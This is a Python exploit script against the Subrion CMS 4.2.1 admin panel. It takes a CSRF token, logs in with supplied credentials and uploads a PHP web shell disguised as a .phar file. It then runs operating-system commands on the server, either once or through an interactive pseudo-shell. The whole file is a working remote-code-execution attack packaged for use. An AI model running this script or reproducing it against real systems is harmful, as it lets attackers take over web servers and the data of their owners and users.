import requests
import argparse
import re

class Subrion:
    def __init__(self,target,username,password,rce):
        self.target = target
        self.username = username
        self.password = password
        self.rce = rce
        self.url = self.check_url()

        self.session = requests.Session()
        self.token = self.get_csrf() #Required for Login
        self.login()
        self.upload()

    def check_url(self):
        check = self.target[-1] #Get the last character
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def get_csrf(self):
        csrf = self.session.get(self.url)
        print("Getting security token:")
        try:
            token = re.findall("securityToken = '(.*)';",csrf.text)
            print("Got token:",token[0])
            return token[0]
        except IndexError:
            print("Unable to get token :(")

    def login(self):
        print("Login in:")
        login_data = {
            "__st":self.token,
            "username":self.username,
            "password":self.password
        }
        login = self.session.post(self.url,data=login_data)
        if "Dashboard" in login.text:
            print("Logged in!")
        else:
            print("Unable to log in :(")
    
    def upload(self):
        print("Uploading file for RCE")
        upload_url = self.url + "uploads/read.json"
        payload = "<?php echo system($_REQUEST['rse']); ?>"
        file_data = {
            "cmd":"upload",
            "__st":self.token,
            "target":"l1_Lw"
        }
        file_content = {
            'upload[]':('rse.phar',payload,{'Content-Type':'application/octet-stream'},{'Content-Disposition':'form-data'}),
        }

        self.session.post(upload_url,data=file_data,files=file_content)
        file_dir = self.url.replace("panel","uploads")

        file_url = self.session.get(file_dir + "rse.phar")

        if file_url.status_code == 200:
            print("File uploaded")
            self.commands(file_url.url)
        else:
            print("Something went wrong with the upload")

    def commands(self,file_url):
        if args.shell:
            while True:
                try:
                    cmd = input("RCE: ")
                    rce_data = {
                        "rse":cmd
                    }
                    rce_url = self.session.post(file_url,data=rce_data)
                    print(rce_url.text)
                except KeyboardInterrupt:
                    print("Bye Bye!\n")
                    exit()

        if args.rce:
            rce_data = {
                "rse":self.rce
            }
            rce_url = self.session.post(file_url,data=rce_data)
            print(rce_url.text)

if __name__=="__main__":
    print("Subrion 4.2.1 PHAR File Upload Authenticated Remote Code Execution")
    parser = argparse.ArgumentParser(description='Subrion 4.2.1 PHAR File Upload Authenticated Remote Code Execution')

    parser.add_argument('-t', metavar='<Target admin URL>', help='admin target/host URL, E.G: http://subrionrce.com/subrion/panel/', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('-rce', metavar='<Remote Code Execution>', help='-rce whoami', required=False)
    parser.add_argument('-shell',action='store_true',help='Pseudo-Shell option for continous rce', required=False)
    args = parser.parse_args()

    try:
        Subrion(args.t,args.u,args.p,args.rce)
    except KeyboardInterrupt:
        print("Bye Bye")
        exit()